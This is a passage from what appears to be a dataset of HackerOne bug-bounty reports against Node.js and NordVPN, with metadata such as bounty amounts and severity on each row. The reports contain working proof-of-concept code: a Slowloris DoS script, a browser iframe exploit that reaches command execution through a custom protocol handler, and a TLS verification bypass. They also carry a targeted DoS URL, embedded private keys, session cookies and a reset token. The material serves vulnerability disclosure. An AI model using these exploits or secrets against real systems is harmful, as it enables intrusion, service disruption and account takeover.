7hh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQABAoIBAAtjLwiDgORu0FHy
8ZcmxXBX8u6i39W0UYSIPpCcVxioz+JeeIT3FJYDLOJd/TNfcJ/HOlQd20Go5RdsT
9vsahjsk8PIua6YS2GDMgadmvgQ7bWYNGIVdIZXAbiDqu2t50I6TZvd2cKa0LkGnf
10tKqhb/hOXZdf1b/WQeHK+4cO34ZDDLGE884AAOjHrFcU9t6lEgvtg0fHX9VdBwZu
11zKXo/Iik3vPcHpmQtVnIQ+aB8Zr/Z+NvIxP6NmLQPmkm3deJrw/sIXitD06fRtZu
12juWoPzELxMDG9wZ1yMiWbrWua1w462T0+mNlAok6cY8ju0NSpMDnP29NiRzQgNUo
13w4wNpAECgYEAzrymeZfrJgrpKHjcgnohEEdpj/JWzFxj7DY0gjrkZsiFwVVRdcZU
14saKbzwOh4fsyb17PXn/Set8gsxigcKRu8n8j0llOfVlK8H3zspa9xU2NvBVtYpzD
1589BRCocLKmr9V2E+KQ8b0shfcOtWX1rUCKrDHDGxCzJt20hMzSnNIr0CgYEAwszl
16ABcGu9fbtzBZmcumuN4YO7Q4yCgAHdoO5RhJ5hxdXt04b5M18oa6jYzfPa7AA5wM
17AR8jaXMkLIOWBZvWeTZwrEVNoEHh5QOibPjQM/mCNVOhwvQzJXJAsMfhuljkcdKO
182ZRnWrIQJaA52tYaPT/omCu/Kzn8zmvLn4SmfuECgYBfKKqgEXNlgWQtAuTNEhYh
19/hzy6yNU0boUwiaNQzparTYT9YeXZIEberOpKAzdjdh7NvLQlpl1gTr19QH0l1uS
20Nz9v1TexruY1qGQB8izLopT43AwLdgkkMuD6rYpQLgsKq3IHSDMQZLa5rTmGjrJG
21gwNn+N97Pe0fIDppvTH1KQKBgAYH6+sVy2qTY0UHpS6CxJWioqNuj/d6bY5/CskC
22+H68UBO4y5+AskHg8/Of8eVp/J3f/esm+KSyIOOT61gfHAPCsLhUqPOWNpUtiKDR
23Dzkct3BJN4/emZrGL8SJW662Q9RWTX/k/VIsgx13GXNx/3v3946GhDOlZvNJGRPG
24OpVhAoGAX2C8di2SWA1Li0A+lqc3zwu/RZX7fe7s6nmqbwb6Fh5mooRaLZIXJSJk
250/onZP769vk5WZgvvWKf6d11e4/uqYcQBOgvLAkucf6KF26vmkVenb1rjl6WDN9N
268S/HZ+9vPo/EQkK0raNL8VkmTRvTf/JhB9yByrEisAf0ivgYJto=
27-----END RSA PRIVATE KEY-----
server.crt
Code 1.27 KiBWrap lines Copy Download1-----BEGIN CERTIFICATE-----
2MIIDlzCCAn+gAwIBAgIJAK4r13axUKSaMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNV
3BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
4aWRnaXRzIFB0eSBMdGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDAeFw0x
5OTExMjYxNTA2MzRaFw0yMDExMjUxNTA2MzRaMGIxCzAJBgNVBAYTAkFVMRMwEQYD
6VQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBM
7dGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDCCASIwDQYJKoZIhvcNAQEB
8BQADggEPADCCAQoCggEBAM3sBD3meSnfghzSli0PD3UD8IKKytA7PQnMC9BiKqvW
9hNZPfdTLiZAgsA3wwsmpMkHKCpB8/lQ53dR0QYfjncOafVdmFMWkNR/BsUSiHy+4
10kDQzLK/DojEOlHaMARF3LGCKD7S4hBhJIC9rLgeZyKisgm2pAGmAEGNIGWTE5AUu
11t0TBlef/+CqODM1Mxf2lKWlRE6FqEA27nCi4U/ct9g0zOzrjh4vGrwcXV8BDtLvB
12APOCdeCTEo/iX65cdH2LC9ZQ6XQMl2OfIyTjvHanBFf8Jq6VbbMuqPTBytCtd5Lv
13rT7k8QZasfyzvXTNSfwjvUoMogTFH7rtAxBWVaDaD+0CAwEAAaNQME4wHQYDVR0O
14BBYEFGOFBfdtlcbkFjMboi5U8RDmttJyMB8GA1UdIwQYMBaAFGOFBfdtlcbkFjMb
15oi5U8RDmttJyMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAFB3uST4
16NX6NS3V99a1JvwalHYOPkStR4DHG601hWuBjqM4jmU5H851/ATbcusFvXnmQ2hGC
17ksHJh9V5wd1Rdjybj6UlgZ6GWTdK6qTJnwUBu0v2aNTM9No4OdP6G15Wr9B1hmw4
18UoqmSbpoCd4KRhVNAL1iwotPclbbJUBFPrJLJ3w7+sq9yB/eskYadtHsqS+YNJ/G
19WNxtkIuDQbRU4hOJAjWDZDbDTDC9a7UnpNgniUgOXlJwANb5CHe+MIZkVn2phGnN
20p5w6+SxQn1ORRDGeg5anGzpvKLppvuRWjON+UFTuErijEIp431WxloezcyLcwZHU
213JE73HqyfQAFj+o=
22-----END CERTIFICATE-----
server.key:
Code 1.66 KiBWrap lines Copy Download1-----BEGIN PRIVATE KEY-----
2MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDN7AQ95nkp34Ic
30pYtDw91A/CCisrQOz0JzAvQYiqr1oTWT33Uy4mQILAN8MLJqTJBygqQfP5UOd3U
4dEGH453Dmn1XZhTFpDUfwbFEoh8vuJA0Myyvw6IxDpR2jAERdyxgig+0uIQYSSAv
5ay4HmciorIJtqQBpgBBjSBlkxOQFLrdEwZXn//gqjgzNTMX9pSlpUROhahANu5wo
6uFP3LfYNMzs644eLxq8HF1fAQ7S7wQDzgnXgkxKP4l+uXHR9iwvWUOl0DJdjnyMk
747x2pwRX/CaulW2zLqj0wcrQrXeS760+5PEGWrH8s710zUn8I71KDKIExR+67QMQ
8VlWg2g/tAgMBAAECggEAV8Or2yYLpgkYz2gBkZrFn73aGAlHf5B/51kL//iW7z4y
9x5SBsNw++Sq1XnuqyYBPZzLRZdugGg2/ufkCpQQiDWge280qNUJTUgGfp/zhBdnH
10vDfDZ/YdfoMUS6JIIkWEqHCvWPr7cc5Y5Vzs9VhZ6Wn8/Pf2sQBf+7CTAhvYg0wt
11PKY3ZnVEyATmDtncD2Jhbv/CI4yfMEWaG5ONjWW+dFNCjfivaMpiRo7vU/B/EQ76
12npXtljMf53mSdRiubShJVQf8ipZW/rJTDZr1ZawFomY1gawhLp90hIFr6D8C4zX0
13r7F0zwC6A5XjOzRPVeAz0FXVCOO+4Plceryd297pkQKBgQD8mgg7OJFwMun9XFDO
14j3GTPuKl/ao0fwYyDdsN/r33GpHtdZGMcUa8VYlAKvL25BQjSIWftkzoIHZqe/NU
15DALbUUh4jknC8HNvaJQGwO6kmJKxnU4v3kg9EHSiIjbiBknoKNQ+bK34P43nzPLB
16tIT6xyeRME/uxj7vvqW6jQ1qBwKBgQDQsTfLtAt7RWHegH4MPgHeFLeqWxAn1vWM
17aIhbez+a/g1s/oR8gFzfXWh/c+H2d/kDOwWGBjGUeFpz+yJzIfQ0gOo350+g0oyU
18ZDwIQ2/BiR6GMGNVfTPRzukb1cXs5BMzySHG3ouvZdLPOucoLDPORj5I5T254EIG
19FXJZ0TeJawKBgH2/bFOW4If7QJK5Dx0VOZP0nT3G3qFNjtcCIMeBxi2qE3UjrvY8
20OdtttWq1NsiDWCcMZkDQrs5rwqdV1xdC93UYrLwfEUczDjQq2m3WQ7a6oWQ8C/02
21ab3EYFuKLsosGUSydp4w2hYYBVucokidxglVdTQI2fHizNfqj3Qj3canAoGAAVjT
22el4cINyOyCfeKGgSDQPnN5NE5Gzvwss97hE6lN6E6aou4rrVXp+0t/XghH27vriX
23zYims0Wfl9YMH+AdOmWGnXvBuNEDFUYcWRVOWFpxNv6C9Z9MQVNrj8FueJv0P8ZR
24kH4JOsWWeb3wlgLLBs7PQhswrc1zv6RNy6SdDicCgYBc/zi70iBH27P0RdPL4ypx
253mjuRcAGEJvCB1AoEI0ib01M+XQJWbMv2wx0xQLDQpOdtuN2yAQi/QCkU8tp+Ztq
26uRAZ5yops0ciaWLDMOQrdp4f8OCxd/mm2xGjWV7PNSE+52+UmOTGGNQNP4n8f1QJ
27NCRD4APLro338oCS2zUQMQ==
28-----END PRIVATE KEY-----
Impact
denial of service - remotely crashing a server",https://hackerone.com/reports/746733,California,United States,San Francisco,2019,11,26,16,10
Node.js,11-50,0.0,1m-10m,$250.00,Low,2.0,Denial of Service,"Slowloris, body parsing","underflow0  submitted a report to Node.js.Feb 18th (3 years ago)Summary: [add summary of the vulnerability]
Attackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open by maintaining activity, and use resources over an extended period.
Description: [add more details about this vulnerability]
Body data is sent one byte at a time, slowly, in a HTTP request. The connection stays open, hogging resources. There is no builtin feature that can make this trigger a timeout, as long as the bytes are sent at an interval lower than the server.timeout value if it is set. May not technically be a Node.js bug since it doesn't handle parsing of the body, but the typically body parsing library (e.g. https://www.npmjs.com/package/body-parser) does not implement any feature to mitigate the vulnerability.
Steps To Reproduce:
(Add details for how we can reproduce the issue)

Start a HTTP server and set the server timeout to 2 seconds.
Add a library that parses the request body.
Open a connection to the server.
Send a HTTP header.
Send the body, 1 byte per second.

Impact: [add why this issue matters]
See summary.
Supporting Material/References:
Code to reproduce
Code 1.14 KiBWrap lines Copy Download1const bodyParser = require('body-parser');
2const express = require('express');
3const net = require('net');
4const http = require('http');
5
6async function run() {
7    const expressApp = express();
8
9    expressApp.use(bodyParser.json());
10
11    expressApp.use(async (req, res) => {
12        res.send({body: req.body});
13    });
14
15    const server = http.createServer(expressApp);
16
17    setInterval(() => {
18        console.log(server.connections);
19    },  1000);
20
21    server.keepAliveTimeout = 2000;
22    server.timeout = 2000;
23
24    await new Promise(resolve => {
25        server.listen(3000, '127.0.0.1', () => {
26            resolve();
27        });
28    });
29
30    const client = new net.Socket();
31
32    const length = 5000;
33
34    const msg = `GET / HTTP/1.1
35Host: localhost:3000
36Accept: */*
37Content-Type: application/json
38Content-Length: ${length}
39
40[""`;
41
42    client.connect(3000, '127.0.0.1', async function () {
43        client.write(msg);
44
45        for (let i = 0; i < length - 4; i++) {
46            await new Promise(resolve => {
47                setTimeout(resolve, 1000);
48            });
49
50            client.write('' + (i % 10));
51        }
52
53        client.write('""]');
54    });
55}
56
57run();
Impact
Attackers can cause a Denial of Service by sending HTTP request body data extremely slowly to keep a connection open and use resources over an extended period.",https://hackerone.com/reports/799072,California,United States,San Francisco,2020,2,18,21,52
Node.js,11-50,0.0,1m-10m,$250.00,Medium,6.7,Privilege Escalation,Node Installer Local Privilege Escalation ,"deepsurface-robert  submitted a report to Node.js.May 28th (about 1 year ago)Node is vulnerable to local privilege escalation attacks under certain conditions on Windows platforms. More specifically, improper configuration of permissions in the installation directory allows an attacker to perform two different escalation attacks: PATH and DLL hijacking.  
To demonstrate this flaw, we first download the latest version of Node from https://nodejs.org/en/download/. At the time of writing, this was node version 14.17.0. 
We follow the standard installation steps, except for the installation directory, which we change to C:\tools. This directory can either be created through the installer GUI, or through mkdir C:\tools. 
Image F1318095: image1.png 16.45 KiBZoom in Zoom out Copy Download
We also select the option in a later step to “automatically install the necessary tools”. 
In the screenshot below, note the improper permissions, BUILTIN\Users Allow *, on the installation directory, which are inherited from the drive root. This gives any local user the ability to create arbitrary files in the installation directory. 
Image F1318096: image4.png 32.53 KiBZoom in Zoom out Copy Download
This unprotected directory has also been added to the system PATH variable, allowing an attacker to drop malicious executables in that directory and have them executed by other users in certain circumstances. (Note that you may have to start a new powershell instance to see the PATH change.)
Image F1318097: image5.png 47.69 KiBZoom in Zoom out Copy Download
To fully demonstrate the implications of this vulnerability, first create a new unprivileged user. Then, as this user, drop a malicious exe into the C:\tools directory and rename it to npm.exe. For testing purposes, you can simply do cp node.exe npm.exe. Note that the same could be done for npx. 
Windows will search for a program with the .exe extension first, meaning that the malicious npm.exe will take precedence over npm.cmd. 
Now, as the privileged user, try running npm. This should drop you into the node shell, demonstrating how an attacker could run a malicious executable. 
Image F1318098: image2.png 12.51 KiBZoom in Zoom out Copy Download
A writable PATH directory would also allow an attacker to hijack the execution of any commands that come later in the path. From the default node installation, this would include chocolatey, a software management tool for Windows. However, such a vulnerability could also affect all programs installed in the future as well. 
Aside from the PATH vulnerability, the insecure permissions configured could also allow an attacker to perform a DLL hijacking attack against the node.exe. Using Process Monitor, we can confirm that node attempts to load a number of DLLs from the unprotected folder. 
Image F1318099: image3.png 25.49 KiBZoom in Zoom out Copy Download
For more information on DLL hijacking attacks, see our blog post. 
It is worth noting that a very similar problem was discovered in RabbitMQ and reported by the DeepSurface Security research team. The RabbitMQ team fixed this issue in May 2021. For more information, see: CVE-2021-22117.
Impact
A locally  unprivileged attacker could perform a local privilege escalation attack through PATH and DLL hijacking.5 attachments:F1318095: image1.pngF1318096: image4.pngF1318097: image5.pngF1318098: image2.pngF1318099: image3.png",https://hackerone.com/reports/1211160,California,United States,San Francisco,2021,5,28,0,40
Node.js,11-50,0.0,1m-10m,$250.00,High,7.95,Man-in-the-Middle,Node.js: TLS session reuse can lead to hostname verification bypass,"fwilhelm  submitted a report to Node.js.Mar 5th (3 years ago)The Node.js TLS library supports client side reuse of TLS sessions when multiple connections to the same server are opened.
Code that wants to use this feature can listen for the 'session' event (https://nodejs.org/api/tls.html#tls_event_session) on a tls.TLSSocket to get notified of newly created TLS sessions. The documentation for this event explicitly mentions that the passed sessions ""can be used immediately or later"".
The problem with this design is that 'session' events are triggered even if verification of the server certificate hostname in onConnectSecure fails. (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/_tls_wrap.js#L1502):
onConnectSecure is triggered by the OpenSSL info callback (with the flag SSL_CB_HANDSHAKE_DONE) after a TLS handshake. The 'session' event is triggered by OpenSSLs get_session_cb, which can happen before the info callback in TLS 1.2 and after in TLS 1.3 and which is triggered regardless of the result of onConnectSecure.
This means that sessions where the server presented an invalid certificate, or one with a wrong hostname, will trigger the session event and can end up being reused or stored in a cache.
That behavior is insecure, because resumed sessions will not be subjected to another hostname verification check as long as they are CA signed:
// Verify that server's identity matches it's certificate's names
// Unless server has resumed our existing session
if (!verifyError && !this.isSessionReused()) {
const hostname = options.servername ||
options.host ||
(options.socket && options.socket._host) ||
'localhost';
const cert = this.getPeerCertificate(true);
verifyError = options.checkServerIdentity(hostname, cert);
}
In practice, this means that the immediate reuse described in the API documentation is always insecure and that session caches are at risk of storing insecure sessions. The most important implementation of a session cache is in the https library (https://github.com/nodejs/node/blob/b1d4c13430c92e94920f0c8c9ba1295c075c9e89/lib/https.js#L130): New sessions are stored in the cache when the ‘session’ event is triggered and are evicted once a tls socket is closed with an error. 
 if (options._agentKey) {
// Cache new session for reuse
socket.on('session', (session) => {
this._cacheSession(options._agentKey, session);
});
    // Evict session on error
socket.once('close', (err) => {
if (err)
this._evictSession(options._agentKey);
});
}
This opens a small race window where an invalid session can be used by other HTTPs requests to the same host. The attached proof-of-concept wins the race reliably against a local server using a setImmediate() callback, but there are probably other ways this could be exploited in real world applications. I also did not fully investigate if there is a way to trigger the socket ‘close’ event with no error which would skip the session eviction and turn this into a 100% reliable bypass.
The POC requires a target server with a valid CA signed certificate (for an arbitrary hostname) and support for TLS resumption. I’ve attached a minimal golang https server that worked for me.
[fwilhelm@fwilhelm node]$ ../node/node-v13.9.0-linux-x64/bin/node poc.js
[!] First request failed:Host: nodejs.org. is not in the cert's altnames: DNS:loca.host
[x] Starting second request
[x] Dumping globalAgent._sessionCache.map:
{
'nodejs.org:8444:::::::::::::::::TLSv1_2_method:': <Buffer 30 82 06 2f 02 01 01 02 02 03 04 04 02 13 01 04 20 cd b7 17 84 ac 9f 31 6f 1c cc 73 de 31 05 eb dc 60 62 df c7 c5 d5 8c b4 75 cc a7 28 1f d9 c0 22 04 ... 1537 more bytes>
}
[!] Bypassed hostname verification. Server response: 200
{
date: 'Thu, 05 Mar 2020 17:08:24 GMT',
'content-length': '29',
'content-type': 'text/plain; charset=utf-8',
connection: 'close'
}
This bug is subject to a 90 day disclosure deadline. After 90 days elapse,
the bug report will become visible to the public. The scheduled disclosure
date is 2020-06-03. Disclosure at an earlier date is also possible if
agreed upon by all parties.
Impact
MitM of TLS connections2 attachments:F738445: poc.jsF738446: server.go",https://hackerone.com/reports/811502,California,United States,San Francisco,2020,3,5,17,30
Nord Security,1001-5000,0.0,No value,$200.00,Low,2.0,None,DoS of https://nordvpn.com/ via CVE-2018-6389 exploitation,"cassiomcampos  submitted a report to Nord Security.Dec 5th (3 years ago)There is possibility in /wp-admin/load-scripts.php script to generate large (~3Mb) amount of data via simple non-authenticated request to server.
The vulnerability is registered as https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389
Details
Detailed attack scenario is described for example here: https://baraktawily.blogspot.ru/2018/02/how-to-dos-29-of-world-wide-websites.html
I have an Apache JMeter script which is able to simulate necessary loading for your site (can be provided to you if necessary).
Ready for call URL is following
https://nordvpn.com/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
Image F651471: poc.jpeg 333.27 KiBZoom in Zoom out Copy Download
As no rate-limiting is setup for this URL - then DoS comes real.
Variants to fix issue
change default ""admin"" directory name (Security through obscurity)
or apply some password protection to /wp-admin/ url
or apply some rate-limiting (but DDoS is still possible)
Other possible Fix
https://github.com/Jetserver/CVE-2018-6389-FIX
Impact
DoS of the site and application server1 attachment:F651471: poc.jpeg",https://hackerone.com/reports/752010,No value,No value,No value,2019,12,5,14,58
Nord Security,1001-5000,0.0,No value,$600.00,Low,2.0,Cleartext Transmission of Sensitive Information,Password Reset Link Leaked In Refer Header In Request To Third Party Sites ,"th3pr0xyb0y  submitted a report to Nord Security.Dec 4th (3 years ago)Summary by th3pr0xyb0ySummary:
It has been identified that the application is leaking referrer token to third party sites. In this case it was found that the password reset token is being leaked to third party sites which is a issue knowing the fact that it can allow any malicious users to use the token and reset the passwords of the victim.
Steps To Reproduce:
Step 1 - Go To https://ucp.nordvpn.com/lost-password Page
Step 2 - Enter Your Email And Click On Reset Password
Step 3 - Go To Email & Click on Password Reset Link
Step 4 - On Password Reset Page Click On Social Media Links Given Below And Capture The Request Using Burp Suite
Step 5 - You May Observe Full Password Reset Link Is Exposed To Third Party Sites
See The Request Captured When i Click on Facebook Social Media Button
GET /nordvpn/ HTTP/1.1
Host: www.facebook.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://ucp.nordvpn.com/reset-password/7ac4b7c4654797e8f2a061676314b0959e7de179d33a73dfaa0152b1ec617f46/
Cookie: fr=1oATYBf0BJ0DXndaC.AWV1Ag1KKbwlzMPBUI8vUz2NaP0.BduttV.ZM.F3B.0.0.BdwUoa.AWWnaTR3; sb=Vdu6XRBcBVULAbruWmZbgfPF; datr=Vdu6Xar5xVM18qIAfGd61Mh3; c_user=100003539320116; xs=4%3AcaHYJilvx4Lkqg%3A2%3A1572948495%3A6163%3A4671
Upgrade-Insecure-Requests: 1
Supporting Material/References:
[list any additional material (e.g. screenshots, logs, etc.)]
Find The Screenshot And Video Attached Below ## Solution: For remediation, you should stop the third party sites to show the referrer header by adding rel=""noopener noreferrer"" to external links in the footer. or check the reference below.
Ref: https://mathiasbynens.github.io/rel-noopener/
Impact
For Example User A Forgots His Password He Got To Forgot Password Page Reset And Receive Link By Email And Opened The Password Forgot Page Then Eventually User Remembers His Password And Though To Use Some Facebook he Opened Nordvpn facebook page or click on social media page then the link will be leaked in refer header
It allows the person who has control of particular site to change the user's password (CSRF attack), because this person knows reset password token of the user.
Other Impact -Account Takeover Possible
The Person Operating NordVpn Social Media Page Can Also Exploit like if they have enabled page analytics then they may see from where users are referring onto there page and from there they see that password reset link and can reset the password for victim",https://hackerone.com/reports/751581,No value,No value,No value,2019,12,4,20,6
Nord Security,1001-5000,0.0,No value,$500.00,Medium,6.8,OS Command Injection,Possible RCE through Windows Custom Protocol on Windows client,"cyku  submitted a report to Nord Security.Oct 7th (2 years ago)Summary:
The NordVPN windows client application registered two custom protocols NordVPN: and NordVPN.Notification: for process communication. This makes us are able to  communicate with NordVPN.exe from web browser.
After looking the executable binary, I noticed the class NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl eventually calls function  Process.Start with controllable argument, and this notification can be triggered through custom protocol NordVPN.Notification:.
So it's possible to execute arbitrary system command from web browser.
Steps To Reproduce:


Create the malicious URL, the below is my script to generate the URL, it requires importing ""Newtonsoft.Json.dll"" and ""NordVpn.Core.dll"".
Code 694 BytesWrap lines Copy Download1// Program.cs
2using System;
3using System.Collections.Generic;
4using NordVpn.Core.Tools;
5using NordVpn.Core.Models.ToastNotifications.Notifications;
6using System.Diagnostics;
7
8namespace ExploitApp
9{
10    class Program
11    {
12        static void Main(string[] args)
13        {
14            Dictionary<string, string> arguments = new Dictionary<string, string>();
15            arguments[""OpenUrl""] = ""calc.exe"";
16            NotificationActionArgs toastArgs = new NotificationActionArgs("""", arguments);
17            String exploit = ObjectCompressor.CompressObject(toastArgs);
18            Console.Write(String.Format(""NordVPN.Notification:{0}"", exploit));
19            Console.ReadKey();
20        }
21    }
22}


Add the URL into a html file with iframe tag, then serves it on HTTP server.
Code 407 BytesWrap lines Copy Download1<!-- exploit.html -->
2<!DOCTYPE html>
3<html lang=""en"">
4<head>
5    <meta charset=""UTF-8"">
6    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
7    <title>Exploit</title>
8</head>
9<body>
10    <iframe src=""NordVPN.Notification:UAAAAB+LCAAAAAAABAANy0EKgCAQBdC7/LV0AHdC0K5WHWAQi4FpFB2hkO5eb/8Glpp7gQcc1mx8cCTjrEFJHuPYZjKC1y7iEOrZr6TW4Ae2knSv8tdIEqd0J7zvBy7afohQAAAA""></iframe>
11</body>
12</html>


Open the html file in the browser. Modern web browser may popup a window to confirm to open NordVPN.exe, if we choose ""Open NordVPN"", the command will be executed and popup a calc.exe.


Proof of Concept Gif
Tested on Windows client lastest version 6.31.5.0.
Image F1024995: possible_rce_in_windows_client.gif 936.45 KiBZoom in Zoom out Copy Download
Additional Information
The below is the simple call stack to Process.Start from ListenNotificationOpenUrl.
Code 367 BytesWrap lines Copy Download1NordVPN.exe/NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl.OnInteraction(NotificationActionArgs args)
2    NordVpn.Application.Core.dll/NordVpn.Application.Core.ViewModels.Shell.ShellViewModel.Handle(ShowBrowserMessage message)
3        NordVPN.exe/NordVpn.Views.Shell.FaultHandlingDefaultBrowser.Open(string url)
4            Process.Start(string fileName);
Impact
Possible to execute system command on victim's computer and take control of the computer.1 attachment:F1024995: possible_rce_in_windows_client.gif",https://hackerone.com/reports/1001255,No value,No value,No value,2020,10,7,15,48
Nord Security,1001-5000,0.0,No value,$500.00,Medium,5.3,Improper Authentication - Generic,No Rate Limit On Forgot Password Page Of NordVPN,"th3pr0xyb0y  submitted a report to Nord Security.Dec 4th (3 years ago)Introduction
A little bit about Rate Limit:
A rate limiting algorithm is used to check if the user session (or IP-address) has to be limited based on the information in the session cache.
In case a client made too many requests within a given timeframe, HTTP-Servers can respond with status code 429: Too Many Requests.
## Description:-
I have identified that when Forgetting Password for account , the request has no rate limit which then can be used to  loop  through one request. Which can be annoying to the root users sending mass password to one email.
Steps To Reproduce The Issue
Step 1-Go To This Link https://ucp.nordvpn.com/lost-password
Enter Email  Click On Forget Password 
Step 2- Intercept This Request In Burp And Forward Till You Found Your Number In Request Like {""email"":""your email here""}
POST /api/v1/users/password/remind HTTP/1.1
Host: ucp.nordvpn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://ucp.nordvpn.com/lost-password
Content-Type: application/json
X-CSRF-TOKEN: bf5c83a8cc20614f5860b7d78db33defd0a7b771298df0a75697f1233887c533
Origin: https://ucp.nordvpn.com
Content-Length: 33
Connection: close
Cookie: __cfduid=d8a4abc6bf515ac9af9ed7f26ad7ce34d1575488422; PHPSESSID=fd0c1b36e54de850296372c91d6661f6; FirstSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191204; CurrentSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191204; _gcl_au=1.1.939613586.1575488429; fontsCssCache=true; _ga=GA1.2.1984155519.1575488431; _gid=GA1.2.1153866363.1575488431; _tq_id.TV-63728145-1.1291=fee56460f81b26c8.1575488432.0.1575491145..; ReturningSession=source%3D%28direct%29%26medium%3D%28none%29%26campaign%3Ddirect%26term%3D%26content%3D%26date%3D20191204; cf_clearance=4398f1d0e3c4c4ddbb9daa33c7f5345c8fb6d622-1575490166-0-150; locale=en; nord_countdown=1575525918702
{""email"":""funtechgame@gmail.com""}
Step 3- Now Send This Request To Intruder And Repeat It 100 Time By Fixing Any Arbitrary Payload Which Doesn't No Effect Request I Choose Accept-Language: en-US,en;q=0.$5$
Step 4 - See You Will Get 200 ok Status Code & 100 + Email In Your INBOX
See It Is Resulting In Mass Mailing Or Email Bombing To Your Users Which Is Bad For Business Impact
Solution -
I Will Recommend You To Add A ReCaptcha & Sort Of Something Which Requires Manual Human Interaction To Proceed Like You Can Add Captcha Like 2+2=___ so that it cannot be brute forced and you also can have a limit at the backend for particular number upto 5 times a day user can request Forget Password Email or Link something like that will prevent you from someone exploiting this vulnerability
POC- Find Video Attached Below
Impact
If You Are Using Any Email Service Software API Or Some Tool Which Costs You For Your Email This Type Of Attack Can Result You In Financial Lose And It Can Also Slow Down Your Services It Can Take Bulk Of Storage In Sent Mail Although If Users Are Affected By This Vulnerability They Can Stop Using Your Services Which Can Lead To Business Risk1 attachment:F650530: bandicam_2019-12-05_01-56-15-194.mp4",https://hackerone.com/reports/751604,No value,No value,No value,2019,12,4,20,44
Nord Security,1001-5000,0.0,No value,$200.00,Medium,4.6,Denial of Service,xmlrpc.php FILE IS enable it will used for Bruteforce attack and Denial of Service(DoS),"shardulb_23  submitted a report to Nord Security.Dec 5th (3 years ago)Hi Team,
The website https://www.nordvpn.com has the xmlrpc.php file enabled and could thus be potentially used for such an attack against other victim hosts. Wordpress that have xmlrpc.php enabled for pingbacks, trackbacks, etc. can be made as a part of a huge botnet causing a major DDOS.
URL: https://nordvpn.com/xmlrpc.php
In order to determine whether the xmlrpc.php file is enabled or not, using the Repeater tab in Burp, send the request below.
Request:
POST /xmlrpc.php HTTP/1.1
Host: nordvpn.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
